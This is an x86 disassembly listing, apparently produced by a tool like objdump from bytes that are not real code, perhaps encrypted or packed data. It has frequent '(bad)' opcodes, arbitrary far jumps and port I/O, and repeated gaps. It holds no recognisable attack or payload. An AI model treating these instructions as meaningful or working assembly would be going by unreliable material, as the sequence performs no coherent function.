  4211ac:	or     ax,0x454d
  4211b0:	leave  
  4211b1:	push   ebx
  4211b2:	cmp    eax,0x1a293ce8
  4211b7:	sub    eax,0xfed71af2
  4211bc:	iret   
  4211bd:	jecxz  0x42123b
  4211bf:	ret    
  4211c0:	loope  0x42115f
  4211c2:	dec    edi
  4211c3:	shr    DWORD PTR [eax+0x674dfeec],0x34
  4211ca:	sbb    al,al
  4211cc:	or     al,0x2f
  4211ce:	aaa    
  4211cf:	imul   ebp,DWORD PTR [eax-0x5fb82830],0x3e5d5287
  4211d9:	bound  ebp,QWORD PTR [edx+0x6bce08af]
  4211df:	ins    DWORD PTR es:[edi],dx
  4211e0:	push   edx
  4211e1:	inc    ebp
  4211e2:	jmp    0x421194
  4211e4:	jl     0x4211fc
  4211e6:	or     esi,ebx
  4211e8:	mov    BYTE PTR ds:0x7d84eafc,dh
  4211ee:	fdiv   QWORD PTR [ebx]
  4211f0:	lods   al,BYTE PTR ds:[esi]
  4211f1:	jmp    0x7bc0:0x94fbc3c8
  4211f8:	ins    BYTE PTR es:[edi],dx
  4211f9:	mov    edi,0xf545ab68
  4211fe:	fidiv  DWORD PTR [ecx-0x23a924d5]
  421204:	mov    al,ds:0xbe52542d
  421209:	inc    esi
  42120a:	and    al,0xff
  42120c:	jmp    0x421260
  42120e:	(bad)  
  42120f:	ss xchg esi,eax
  421211:	jb     0x4211b5
  421213:	sbb    ebp,esi
  421215:	and    al,0x7e
  421217:	ja     0x42122e
  421219:	dec    eax
  42121a:	leave  
  42121b:	ja     0x4211e7
  42121d:	out    0x5f,eax
  42121f:	push   ecx
  421220:	shl    bh,0xb2
  421223:	jo     0x42120c
  421225:	mov    esp,0x6cc30818
  42122a:	pop    ebp
  42122b:	and    eax,0xf0317915
  421230:	(bad)  
  421231:	(bad)  ds:0x2f78a4b
  421237:	dec    edx
  421238:	retf   
  421239:	in     al,0x4
  42123b:	adc    DWORD PTR [ebx+0xfbc6391],ebx
  421241:	fadd   QWORD PTR [eax]
	...
  4212b3:	add    BYTE PTR [ecx+0x6],al
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0xa783dc15
  4212c1:	adc    eax,0x636e73a9
  4212c6:	add    DWORD PTR [eax],eax
  4212c8:	test   BYTE PTR [eax],0x0
  4212cb:	add    BYTE PTR [edx-0x56ba6cca],dl
  4212d1:	leave  
  4212d2:	push   bp
  4212d4:	aam    0x67
  4212d6:	dec    edi
  4212d7:	fcom   QWORD PTR [edi+0x4a]
  4212da:	std    
  4212db:	and    BYTE PTR [ebp+0x4a],ch
  4212de:	jmp    0x1220:0xadf42e5c
  4212e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212e6:	gs jp  0x42128d
  4212e9:	push   ebp
  4212ea:	lods   al,BYTE PTR ds:[esi]
  4212eb:	retf   0x9ad9
  4212ee:	xchg   esi,eax
  4212ef:	dec    ecx
  4212f0:	retf   0xb47f
  4212f3:	push   ecx
  4212f4:	jb     0x4212f9
  4212f6:	xchg   edi,eax
  4212f7:	mov    al,ds:0x50dbabf1
  4212fc:	push   eax
  4212fd:	inc    edx
  4212fe:	add    cl,ch
  421300:	and    BYTE PTR [ecx],0x95
  421303:	pop    ecx
  421304:	sbb    dl,ch
  421306:	outs   dx,DWORD PTR ds:[esi]
  421307:	cdq    
  421308:	push   edi
  421309:	mov    al,ds:0xa56c0f05
  42130e:	push   esp
  42130f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421310:	adc    dh,BYTE PTR [eax]
  421312:	adc    bh,ah
  421314:	pop    eax
  421315:	push   ss
  421316:	int    0xb8
  421318:	shl    DWORD PTR [edi],1
  42131a:	or     eax,0xe56f8698
  42131f:	sbb    ah,BYTE PTR [edx+eax*2]
  421322:	and    DWORD PTR [eax+0x3f],ebp
  421325:	inc    eax
  421327:	sbb    al,0xae
  421329:	pop    eax
  42132a:	sub    edi,DWORD PTR [eax]
  42132c:	outs   dx,BYTE PTR ds:[esi]
  42132d:	in     al,0x3f
  42132f:	rcl    BYTE PTR fs:[edi-0x44],1
  421333:	or     bl,BYTE PTR [esi+0x5dea21b3]
  421339:	or     al,0xfd
  42133b:	ds cmp eax,0xd0036d55
  421341:	pusha  
  421342:	in     eax,dx
  421343:	out    0xd0,al
  421345:	jnp    0x4212f6
  421347:	lea    esi,[esp+edx*8+0x75]
  42134b:	pushf  
  42134c:	inc    eax
  42134d:	xor    edx,DWORD PTR [ebx+0x0]
  421350:	in     eax,dx
  421351:	sbb    al,0xeb
  421353:	loope  0x42135c
  421355:	push   edx
  421356:	popf   
  421357:	mov    al,0x65
  421359:	ret    
  42135a:	or     bh,BYTE PTR [ecx-0x80]
  42135d:	or     cl,BYTE PTR [esi+0x4d]
  421360:	adc    eax,0xb70e6067
  421365:	jle    0x421361
  421367:	jnp    0x4212fa
  421369:	dec    ecx
  42136a:	jmp    0x91e09150
  42136f:	(bad)  
  421371:	xchg   esi,eax
  421372:	test   BYTE PTR [edx+0x14],ch
  421375:	cmp    BYTE PTR [ebx+ebp*2+0x75],bl
  421379:	mov    dh,0xc5
  42137b:	cmp    ebp,DWORD PTR [edx+ebx*2+0x1d0c83b7]
  421382:	mov    al,ds:0x5028c69a
  421387:	sbb    BYTE PTR [ebp+0x33],0x23
  42138b:	jl     0x4213bd
  42138d:	adc    eax,edi
  42138f:	dec    ebx
  421390:	or     eax,0x1d5931e1
  421395:	mov    eax,0x60f10602
  42139a:	std    
  42139b:	inc    edi
  42139c:	fs jle 0x421330
  42139f:	outs   dx,BYTE PTR ds:[esi]
  4213a0:	jbe    0x42133c
  4213a2:	test   eax,0xadd4fd37
  4213a7:	adc    DWORD PTR [esi+ebx*4-0x76d1c007],ebx
  4213ae:	(bad)  
  4213af:	lds    ebp,FWORD PTR [esi-0x446f39e]
  4213b5:	add    bl,BYTE PTR [ecx+edx*2-0x3d]
  4213b9:	sub    BYTE PTR fs:[ecx+0x52a18421],ch
  4213c0:	outs   dx,BYTE PTR ds:[esi]
  4213c1:	or     eax,DWORD PTR [eax]
	...
  421433:	add    BYTE PTR [esi+0x7f125794],ch
  421439:	shr    edi,cl
  42143b:	mov    esp,0x960320e2
  421440:	push   eax
  421441:	mov    edx,0x64649f61
  421446:	add    DWORD PTR [eax],eax
  421448:	test   BYTE PTR [eax],0x0
  42144b:	add    BYTE PTR [eax+ebx*8-0x27739604],cl
  421452:	inc    ecx
  421453:	or     al,0x18
  421455:	sbb    DWORD PTR [ecx],ebp
  421457:	sbb    al,0x10
  421459:	push   es
  42145a:	dec    eax
  42145b:	cmp    BYTE PTR [ecx+eiz*4],al
  42145e:	xor    eax,0x86b633e3
  421463:	push   edi
  421464:	ret    
  421465:	or     ecx,ebp
  421467:	or     ebx,esi
  421469:	out    dx,eax
  42146a:	test   BYTE PTR [ecx+0x524cb5b1],0xe9
  421471:	mov    esp,0xc18fdf76
  421476:	sub    BYTE PTR [eax+0x4aea2c84],cl
  42147c:	xor    DWORD PTR [ebx+ebx*8+0x3687bdda],ebp
  421483:	mov    esp,0x498062d3
  421488:	fsubr  QWORD PTR [ecx]
  42148a:	ins    DWORD PTR es:[edi],dx
  42148b:	jo     0x421461
  42148d:	imul   edi,DWORD PTR [ecx+ebp*2+0x46],0xffffff9d
  421492:	pop    ebx
  421493:	sbb    DWORD PTR [esi+0x41],eax
  421496:	dec    esp
  421497:	sub    al,ch
  421499:	add    eax,0x708a5446
  42149e:	push   edi
  42149f:	sbb    BYTE PTR [ebx+0x61],ch
  4214a2:	jge    0x421426
  4214a4:	out    0x8d,eax
  4214a6:	mov    al,dl
  4214a8:	cmp    ch,BYTE PTR [edx-0x1c510ebb]
  4214ae:	adc    eax,0xeab29dc3
  4214b3:	neg    BYTE PTR [ebx+0x36]
  4214b6:	or     al,0x15
  4214b8:	sub    edx,DWORD PTR [ebp+0x42]
  4214bb:	xor    edx,DWORD PTR [esi+edx*1+0x8]
  4214bf:	out    0x26,al
  4214c1:	das    
  4214c2:	pop    ds
  4214c3:	xor    BYTE PTR [eax+ebp*4],bh
  4214c6:	dec    ebp
  4214c7:	inc    esp
  4214c8:	or     ebp,DWORD PTR [eax]
  4214ca:	inc    ebp
  4214cb:	ror    DWORD PTR [edx],cl
  4214cd:	or     ah,dh
  4214cf:	out    0xc9,eax
  4214d1:	into   
  4214d2:	push   0xffffff95
  4214d4:	loopne 0x42154c
  4214d6:	mov    eax,0x7ea228f8
  4214db:	mov    BYTE PTR [edx],bh
  4214dd:	cmp    bl,dh
  4214df:	sahf   
  4214e0:	arpl   di,si
  4214e2:	adc    eax,0x4668ba6f
  4214e7:	jmp    0x29ae:0x58b0d94d
  4214ee:	pop    ebp
  4214ef:	sbb    ch,BYTE PTR [eax]
  4214f1:	jecxz  0x421482
  4214f3:	or     BYTE PTR [edi],cl
  4214f5:	rol    DWORD PTR [ebp-0x3b],cl
  4214f8:	sbb    eax,0x55a62b9c
  4214fd:	outs   dx,DWORD PTR ds:[esi]
  4214fe:	adc    eax,0xc1a94e2
  421503:	fwait
  421504:	and    dl,BYTE PTR [ebx-0x73143f90]
  42150a:	imul   edx,DWORD PTR [ebx],0xffffff8a
  42150d:	adc    al,0xf5
  42150f:	sbb    BYTE PTR [ebx],bl
  421511:	mov    eax,0xb7f41748
  421516:	jle    0x42153a
  421518:	xor    eax,0x607e64ee
  42151d:	ret    
  42151e:	stos   DWORD PTR es:[edi],eax
  42151f:	cs jmp 0x4214d5
  421522:	lods   eax,DWORD PTR ds:[esi]
  421523:	iret   
  421524:	in     eax,dx
  421525:	sbb    al,0xf5
  421527:	pop    esp
  421528:	mov    eax,ds:0x56fa5d42
  42152d:	int3   
  42152e:	jne    0x42155e
  421530:	push   cs
  421531:	or     DWORD PTR [eax+0x39],ebp
  421534:	in     al,dx
  421535:	push   0xc658ef7a
  42153a:	jo     0x4214c5
  42153c:	loopne 0x421589
  42153e:	sub    al,0x61
  421540:	push   ebx
  421541:	add    DWORD PTR [eax],eax
	...
  4215b3:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4215ba:	mov    ah,0xec
  4215bc:	int3   
  4215bd:	ror    BYTE PTR [edx+ebp*4],cl
  4215c0:	popf   
  4215c1:	lock dec edx
  4215c3:	in     al,0x5a
  4215c5:	add    DWORD PTR gs:[eax],eax
  4215c8:	test   BYTE PTR [eax],0x0
  4215cb:	add    BYTE PTR [ecx+0x33],ah
  4215ce:	xor    ah,ch
  4215d0:	aam    0x86
  4215d2:	mov    ebp,0x111277d7
  4215d7:	lahf   
  4215d8:	or     DWORD PTR [eax],esp
  4215da:	rcr    DWORD PTR [ecx],1
  4215dc:	mov    ds:0x6a22f4c1,eax
  4215e1:	inc    edi
  4215e2:	es fsub st(6),st
  4215e5:	lock mov eax,0xa5200d43
  4215eb:	int    0x6d
  4215ed:	add    al,0x1a
  4215ef:	repz repz cmp ebx,DWORD PTR [ebx-0x48]
  4215f4:	jns    0x421587
  4215f6:	push   edx
  4215f7:	imul   ebp,DWORD PTR [ecx+0x4f984326],0x6cd0ff40
  421601:	push   esi
  421602:	pop    edi
  421603:	(bad)  
  421604:	cld    
  421605:	or     bl,ch
  421607:	adc    BYTE PTR ds:0x36d4172,bh
  42160d:	in     eax,dx
  42160e:	(bad)  
  42160f:	push   ss
  421610:	loop   0x421680
  421612:	aas    
  421613:	mov    WORD PTR [ebx-0x522aab1f],?
  421619:	pop    edi
  42161a:	adc    eax,0xff9ab364
  42161f:	ja     0x421669
  421621:	imul   eax,esp,0xa10bd84
  421627:	loop   0x421653
  421629:	xor    eax,0xb8ca5450
  42162e:	xchg   BYTE PTR [eax+edi*1+0x59],dl
  421632:	out    dx,eax
  421633:	sahf   
  421634:	push   esi
  421635:	fcmovnb st,st(0)
  421637:	(bad)  
  421638:	out    dx,eax
  421639:	nop
  42163a:	jge    0x421698
  42163c:	retf   0x86ce
  42163f:	push   edi
  421640:	mov    eax,0xe476e854
  421645:	push   es
  421646:	mov    cs,ecx
  421648:	rcl    ch,0x1f
  42164b:	ss jo  0x4216cb
  42164e:	pushf  
  42164f:	call   0xbeed:0x77c23232
  421656:	jmp    0x6beb:0x8bf7721a
  42165d:	adc    ah,dl
  42165f:	fcmovbe st,st(3)
  421661:	outs   dx,DWORD PTR ds:[esi]
  421662:	jmp    0x2ce4:0x7af984b4
  421669:	sub    eax,DWORD PTR [eax-0x6b8af5bc]
  42166f:	xlat   BYTE PTR ds:[ebx]
  421670:	bound  esp,QWORD PTR [eax-0x7c]
  421673:	sub    eax,0xa142fbc2
  421678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421679:	push   esi
  42167a:	sbb    ebp,eax
  42167c:	mov    ah,0xa7
  42167e:	fbld   TBYTE PTR [ebp+0x44a1fa14]
  421684:	icebp  
  421685:	mov    esp,ecx
  421687:	cmp    DWORD PTR [eax-0x6f307f84],esp
  42168d:	add    DWORD PTR [eax-0x74593eaa],eax
  421693:	lahf   
  421694:	push   ebx
  421695:	das    
  421696:	repnz add DWORD PTR [eax-0x10],esp
  42169a:	dec    eax
  42169b:	xor    al,0xe
  42169d:	loopne 0x421704
  42169f:	mov    esi,0x37a1caff
  4216a4:	fidiv  DWORD PTR [edx+0x7f8cd81a]
  4216aa:	(bad)  
  4216ab:	outs   dx,BYTE PTR ds:[esi]
  4216ac:	daa    
  4216ad:	pop    eax
  4216ae:	push   ss
  4216af:	fmul   st,st(2)
  4216b1:	push   0x6a
  4216b3:	pop    edi
  4216b4:	in     al,0xe0
  4216b6:	xchg   DWORD PTR [edx-0x64],esi
  4216b9:	add    ah,BYTE PTR [edi+edi*4-0x76856c86]
  4216c0:	push   edi
  4216c1:	xor    eax,DWORD PTR [eax]
	...
  421733:	add    BYTE PTR [ecx-0x587fdad1],cl
  421739:	mov    ch,BYTE PTR [ebp-0x7e7b35d1]
  42173f:	cmp    edi,DWORD PTR [eax+0x50fe61ee]
  421745:	add    WORD PTR [eax],ax
  421748:	test   BYTE PTR [eax],0x0
  42174b:	add    BYTE PTR [edi+eiz*4-0x4c3d498f],ch
  421752:	mov    ds:0x56a41def,eax
  421757:	add    al,BYTE PTR [ecx]
  421759:	(bad)  
  42175a:	fstp   TBYTE PTR [ecx+0x49f7d13f]
  421760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421761:	dec    eax
  421762:	inc    esp
  421763:	push   ebp
  421764:	and    BYTE PTR [ecx-0x23],dl
  421767:	and    BYTE PTR [ebx],0x1
  42176a:	mov    edx,0x7caab86a
  42176f:	cwde   
  421770:	xchg   edx,eax
  421771:	dec    edi
  421772:	out    dx,al
  421773:	scas   al,BYTE PTR es:[edi]
  421774:	popw   ss
  421776:	mov    dl,0x56
  421778:	inc    DWORD PTR [edi-0x305ee52c]
  42177e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42177f:	bswap  ebx
  421781:	into   
  421782:	jo     0x4217e8
  421784:	and    dh,BYTE PTR [edi-0x46]
  421787:	repnz push edx
  421789:	push   edx
  42178a:	stc    
  42178b:	dec    edi
  42178c:	jb     0x421766
  42178e:	pop    edx
  42178f:	loop   0x421752
  421791:	sbb    bl,0x80
  421794:	jmp    0xbabf:0x3777e10b
  42179b:	stc    
  42179c:	push   esi
  42179d:	xchg   ebp,eax
  42179e:	mov    WORD PTR [edi+0x37],fs
  4217a1:	or     DWORD PTR [edx-0x52],ebx
  4217a4:	retfw  0xa4a9
  4217a8:	xchg   esp,eax
  4217a9:	fmul   DWORD PTR [esi+0x1144e715]
  4217af:	jl     0x421751
  4217b1:	xchg   BYTE PTR [edx+esi*1+0x20327c9a],bl
  4217b8:	sub    DWORD PTR [eax*1-0x72d0cdfd],edx
  4217bf:	sbb    ebx,ecx
  4217c1:	jne    0x42177d
  4217c3:	shl    BYTE PTR [edx+edx*1-0x8],0x61
  4217c8:	call   0x31e6:0x749d8725
  4217cf:	xchg   esp,eax
  4217d0:	outs   dx,DWORD PTR ds:[esi]
  4217d1:	dec    esi
  4217d2:	and    al,0xd2
  4217d4:	mov    WORD PTR [ebx+eiz*1-0x35189c1d],fs
  4217db:	mov    edx,0x6f99329c
  4217e0:	test   al,ch
  4217e2:	push   esp
  4217e3:	stc    
  4217e4:	pop    ecx
  4217e5:	(bad)  
  4217e6:	pop    edx
  4217e7:	push   esp
  4217e8:	xor    DWORD PTR [eax+0x793a6b4e],0x8
  4217ef:	pop    ebp
  4217f0:	addr16 sbb eax,0x29afc35b
  4217f6:	lahf   
  4217f7:	bound  edx,QWORD PTR [ebx]
  4217f9:	jle    0x42178d
  4217fb:	mov    ds:0xe736c166,eax
  421800:	clc    
  421801:	mov    esi,0xbaac7f53
  421806:	xor    DWORD PTR [edx-0x47],edx
  421809:	daa    
  42180a:	xor    BYTE PTR [esi],ch
  42180c:	popf   
  42180d:	data16 jo 0x42186a
  421810:	les    ecx,FWORD PTR [ecx]
  421812:	xor    DWORD PTR [edi-0x13],0x50
  421816:	addr16 js 0x4217fa
  421819:	test   bh,al
  42181b:	test   al,dl
  42181d:	fcomp  st(4)
  42181f:	xor    ebp,ebx
  421821:	addr16 sub eax,0x2c856a1f
  421827:	mov    cl,0xbf
  421829:	sub    BYTE PTR [ebx+0x1a93c459],0xfa
  421830:	fidivr DWORD PTR [esp+esi*8+0x7f53035b]
  421837:	and    dl,BYTE PTR [ebp+0x54]
  42183a:	xor    dl,BYTE PTR [edi+0x17]
  42183d:	pop    edx
  42183e:	xor    DWORD PTR [ebp+esi*8-0x38],edi
	...
  4218b2:	add    BYTE PTR [eax],al
  4218b4:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    ebx,edx
  4218c1:	jmp    0x1:0x67468edf
  4218c8:	test   BYTE PTR [eax],0x0
  4218cb:	add    bl,dl
  4218cd:	js     0x421881
  4218cf:	and    al,0x3e
  4218d1:	fs retf 
  4218d3:	and    eax,0xbc5e2e84
  4218d8:	outs   dx,BYTE PTR ds:[esi]
  4218da:	xchg   ecx,eax
  4218db:	adc    al,BYTE PTR [ecx-0x4b]
  4218de:	lods   eax,DWORD PTR ds:[esi]
  4218df:	out    dx,eax
  4218e0:	mov    ecx,0x963a870c
  4218e5:	push   ebp
  4218e6:	jmp    0x421915
  4218e8:	dec    esi
  4218e9:	inc    edx
  4218ea:	sub    eax,eax
  4218ec:	js     0x421932
  4218ee:	push   esp
  4218ef:	cmp    BYTE PTR [eax-0x56],dh
  4218f2:	fs sahf 
  4218f4:	push   edx
  4218f5:	push   eax
  4218f6:	rcl    DWORD PTR [edi],1
  4218f8:	xor    BYTE PTR [edi],dh
  4218fa:	aam    0x52
  4218fc:	(bad)  
  4218fd:	cmp    esp,ecx
  4218ff:	into   
  421900:	scas   al,BYTE PTR es:[edi]
  421901:	mov    ebx,0x4ead5bbd
  421906:	loopne 0x42194c
  421908:	je     0x421969
  42190a:	sbb    cl,BYTE PTR [eax+ebx*8+0x702769b0]
  421911:	(bad)  
  421912:	call   0x73b7:0x6b13b41
  421919:	dec    ebp
  42191a:	sbb    al,0xb8
  42191c:	inc    edx
  42191d:	adc    dl,BYTE PTR [ebx+0x429ce7db]
  421923:	sbb    DWORD PTR [ebx],0xffffff84
  421926:	out    0xb3,al
  421928:	pop    ecx
  421929:	lahf   
  42192a:	call   0x92501a05
  42192f:	(bad)  
  421931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421932:	(bad)  
  421933:	mov    ecx,0x404eed43
  421938:	mov    dh,0x8c
  42193a:	add    eax,0x7ebb2fc8
  42193f:	stc    
  421940:	mov    edi,0xb0fb67de
  421945:	cmp    edi,DWORD PTR [edi+edi*4-0x4a340f52]
  42194c:	pop    es
  42194d:	or     eax,0xd1656422
  421952:	push   ebx
  421953:	push   ebx
  421954:	leave  
  421955:	mov    ebx,0x664afd97
  42195a:	push   0x75
  42195c:	call   0xbaae:0x7d431978
  421963:	in     al,dx
  421964:	pop    ecx
  421965:	mov    BYTE PTR [ebp-0x4d],ch
  421968:	sub    edi,edi
  42196a:	sub    ax,0x9a35
  42196e:	(bad)  
  42196f:	js     0x4219e4
  421971:	jp     0x42196c
  421973:	add    al,0xca
  421975:	and    DWORD PTR [ecx-0x50a5d527],0x3d9fe6c6
  42197f:	cmp    eax,0x737002c8
  421984:	adc    cl,cl
  421986:	sub    DWORD PTR [ebx-0x2bbbc66d],esp
  42198c:	mov    ds:0x846dab71,al
  421991:	fs enter 0x812e,0x42
  421996:	int3   
  421997:	push   0xa
  421999:	stos   BYTE PTR es:[edi],al
  42199a:	jmp    0x421990
  42199c:	cmp    BYTE PTR [ecx],ah
  42199e:	mov    ah,0xb7
  4219a0:	cwde   
  4219a1:	push   0xffffff96
  4219a3:	dec    esp
  4219a4:	pop    edi
  4219a5:	jecxz  0x421a10
  4219a7:	cmp    eax,DWORD PTR [esi-0x2a]
  4219aa:	loope  0x421a0e
  4219ac:	sub    eax,0x1d7b0116
  4219b1:	test   al,0x6c
  4219b3:	pop    ds
  4219b4:	sahf   
  4219b5:	out    dx,eax
  4219b6:	xor    DWORD PTR [edx+0x761427c2],ecx
  4219bc:	sub    bl,BYTE PTR [esi]
  4219be:	retf   0x272a
  4219c1:	pop    edx
	...
  421a32:	add    BYTE PTR [eax],al
  421a34:	fbstp  TBYTE PTR [edx]
  421a36:	scas   eax,DWORD PTR es:[edi]
  421a37:	adc    ebp,edi
  421a39:	lahf   
  421a3a:	(bad)  
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x2091d5d1]
  421a44:	cmp    al,0x68
  421a46:	add    DWORD PTR [eax],eax
  421a48:	test   BYTE PTR [eax],0x0
  421a4b:	add    BYTE PTR [ebx+0x83538c2],al
  421a51:	aaa    
  421a52:	idiv   BYTE PTR [ebx+0x16]
  421a55:	add    eax,DWORD PTR [edi+0x6571cc4a]
  421a5b:	popf   
  421a5c:	ds (bad) 
  421a5f:	(bad)  [ecx+0x3f2f7811]
  421a65:	jnp    0x421ad5
  421a67:	jecxz  0x421a07
  421a69:	inc    ebx
  421a6a:	shr    al,cl
  421a6c:	sti    
  421a6d:	stc    
  421a6e:	xor    BYTE PTR [ebx],bh
  421a70:	jmp    0xb9b00821
  421a75:	lds    edi,FWORD PTR [edi]
  421a77:	and    cl,ch
  421a79:	test   eax,0xf45dc3be
  421a7e:	mov    ecx,0x5c7a2836
  421a83:	std    
  421a84:	adc    esp,DWORD PTR [eax+0x298d1a20]
  421a8a:	(bad)  
  421a8b:	out    dx,eax
  421a8c:	add    ah,BYTE PTR [edi+ecx*1]
  421a8f:	retf   
  421a90:	dec    ecx
  421a91:	outs   dx,BYTE PTR ds:[esi]
  421a92:	retf   0x49bb
  421a95:	and    bl,BYTE PTR [edi+0x1f6a6bec]
  421a9b:	jbe    0x421b18
  421a9d:	mov    esi,0x9d87ff5b
  421aa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421aa3:	out    dx,eax
  421aa4:	loope  0x421a43
  421aa6:	xor    BYTE PTR [esi],0xf3
  421aa9:	mov    ebx,DWORD PTR [edi+edx*2]
  421aac:	mov    ebp,0x26048f06
  421ab1:	push   ebp
  421ab2:	pop    ecx
  421ab3:	mov    dh,bh
  421ab5:	in     eax,dx
  421ab6:	mov    esi,0x1f21d08e
  421abb:	cmp    esi,DWORD PTR ds:0x8389e25a
  421ac1:	sahf   
  421ac2:	adc    DWORD PTR [eax+0x67],ebp
  421ac5:	mov    ebx,0x1861cdff
  421aca:	mov    dh,0x79
  421acc:	jae    0x421a9b
  421ace:	push   ss
  421acf:	cdq    
  421ad0:	pop    ds
  421ad1:	lahf   
  421ad2:	js     0x421af6
  421ad4:	adc    ch,BYTE PTR [ecx+0x22d7ae49]
  421ada:	in     al,0x7c
  421adc:	fld    TBYTE PTR [esi+ecx*8-0x2161da89]
  421ae3:	pop    ecx
  421ae4:	sub    DWORD PTR [eax-0x415589ec],eax
  421aea:	xor    BYTE PTR [esi+edi*8+0x3f],dh
  421aee:	data16 aas 
  421af0:	cld    
  421af1:	push   ecx
  421af2:	push   esi
  421af3:	loopne 0x421ad1
  421af5:	repnz fisub WORD PTR [ebx]
  421af8:	test   eax,0x5b20ae7c
  421afd:	pop    edi
  421afe:	and    bl,cl
  421b00:	adc    esi,DWORD PTR [edx+ecx*1+0x3604a454]
  421b07:	jbe    0x421ad4
  421b09:	sub    eax,0xeca8b0c9
  421b0e:	ficom  DWORD PTR [esi+0xc0c32d6]
  421b14:	nop
  421b15:	arpl   WORD PTR [ebp+0x1a],dx
  421b18:	push   0xffffff91
  421b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b1b:	mov    ebp,0x3c3732b
  421b20:	add    BYTE PTR ds:[edi],ch
  421b23:	(bad)  [esi-0xd]
  421b26:	fld    TBYTE PTR [ebx+0x126a6f69]
  421b2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b2d:	xchg   DWORD PTR [esi],eax
  421b2f:	cmp    al,0x50
  421b31:	or     esp,esi
  421b33:	xor    bh,dl
  421b35:	xor    edx,DWORD PTR [ebp+edx*8+0x57]
  421b39:	mov    bl,0xb8
  421b3b:	or     BYTE PTR [eax+eax*8+0x469d1dbe],ah
	...
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	mov    dl,BYTE PTR ds:0xbf9fb10b
  421bba:	mov    edx,0xae2d6a3f
  421bbf:	sub    ebp,DWORD PTR [ebp+0x32837896]
  421bc5:	imul   eax,DWORD PTR [ecx],0xf600
  421bcb:	add    BYTE PTR [edx-0x6dbe3a67],cl
  421bd1:	push   ebx
  421bd2:	neg    DWORD PTR [ebx-0x1df48002]
  421bd8:	pop    ds
  421bd9:	mov    al,0xd7
  421bdb:	out    0x73,eax
  421bdd:	jnp    0x421bb8
  421bdf:	(bad)  
  421be0:	aad    0xaa
  421be2:	prefetch BYTE PTR [ebx]
  421be5:	jo     0x421bad
  421be7:	cmp    ebx,DWORD PTR [ebx-0x47]
  421bea:	pushf  
  421beb:	lds    esi,FWORD PTR [eax+edx*1+0x60]
  421bef:	out    0x9,eax
  421bf1:	cmp    ebx,DWORD PTR [ebx]
  421bf3:	(bad)  
  421bf4:	rcl    BYTE PTR [ebp+0x58],1
  421bf7:	inc    ecx
  421bf8:	adc    DWORD PTR [eax],ebp
  421bfa:	mov    esp,0xce9bb640
  421bff:	push   0x64c4097e
  421c04:	push   esp
  421c05:	pop    esp
  421c06:	jmp    0x421baa
  421c08:	jle    0x421c11
  421c0a:	pop    esp
  421c0b:	aas    
  421c0c:	js     0x421ba3
  421c0e:	sub    DWORD PTR [eax-0x39],eax
  421c11:	sbb    eax,0x28f57394
  421c16:	xchg   esi,eax
  421c17:	push   es
  421c18:	leave  
  421c19:	outs   dx,BYTE PTR ds:[esi]
  421c1a:	nop
  421c1b:	les    ebx,FWORD PTR [ebp*1+0x148cc21b]
  421c22:	mov    al,ds:0xa720c032
  421c27:	adc    ah,bl
  421c29:	inc    edi
  421c2a:	movzx  edx,BYTE PTR [ecx+0x50]
  421c2e:	gs mov edx,ss
  421c31:	adc    esp,0x9a7e92bb
  421c37:	jbe    0x421c59
  421c39:	pop    ds
  421c3a:	and    dl,bl
  421c3c:	xor    BYTE PTR [ecx],bl
  421c3e:	dec    esi
  421c3f:	xor    al,0x53
  421c41:	xchg   edi,eax
  421c42:	mov    ds:0x33cb4801,eax
  421c47:	mov    dh,BYTE PTR [eax+0x3d6016ce]
  421c4d:	jae    0x421c0c
  421c4f:	lods   eax,DWORD PTR ds:[esi]
  421c50:	add    DWORD PTR [edi+0x4e856c40],0x3c
  421c57:	(bad)  
  421c58:	cmp    dl,BYTE PTR [esi+0x5000143f]
  421c5e:	mov    ds:0xbcbcc53b,al
  421c63:	add    eax,0x2e6aa1ef
  421c68:	mov    bl,0xe3
  421c6a:	xchg   esp,eax
  421c6b:	mov    dl,0xf6
  421c6d:	(bad)  
  421c6e:	fs pop es
  421c70:	jno    0x421ca3
  421c72:	jmp    0x286a9ac7
  421c77:	cmp    dh,BYTE PTR ds:0x9301ed90
  421c7d:	repz test al,0x3f
  421c80:	cmp    eax,0xf7f10d34
  421c85:	clc    
  421c86:	clc    
  421c87:	adc    edi,DWORD PTR [esi]
  421c89:	mov    cl,0x5f
  421c8b:	inc    edi
  421c8c:	retf   
  421c8d:	clc    
  421c8e:	retf   
  421c8f:	clc    
  421c90:	dec    edi
  421c91:	daa    
  421c92:	lods   al,BYTE PTR ds:[esi]
  421c93:	pop    ecx
  421c94:	aam    0x87
  421c96:	xlat   BYTE PTR ds:[ebx]
  421c97:	pop    ecx
  421c98:	repz cli 
  421c9a:	js     0x421caa
  421c9c:	mov    bl,0xcc
  421c9e:	aaa    
  421c9f:	pusha  
  421ca0:	arpl   di,cx
  421ca2:	xor    bh,0xed
  421ca5:	mov    esi,0x89c9d8b7
  421caa:	dec    esi
  421cab:	jle    0x421cc8
  421cad:	stc    
  421cae:	or     BYTE PTR [ebp-0x3d],ah
  421cb1:	outs   dx,DWORD PTR ds:[esi]
  421cb2:	shl    ebp,1
  421cb4:	leave  
  421cb5:	push   edx
  421cb6:	(bad)  
  421cb7:	arpl   ax,bx
  421cb9:	scas   eax,DWORD PTR es:[edi]
  421cba:	ret    
  421cbb:	fdivr  QWORD PTR [esi-0x4d]
  421cbe:	jmp    0x421c40
  421cc0:	adc    edx,DWORD PTR [ebp+0x0]
	...
  421d32:	add    BYTE PTR [eax],al
  421d34:	out    0x1e,eax
  421d36:	into   
  421d37:	push   0x9fe7f8ff
  421d3c:	cmp    al,0xf2
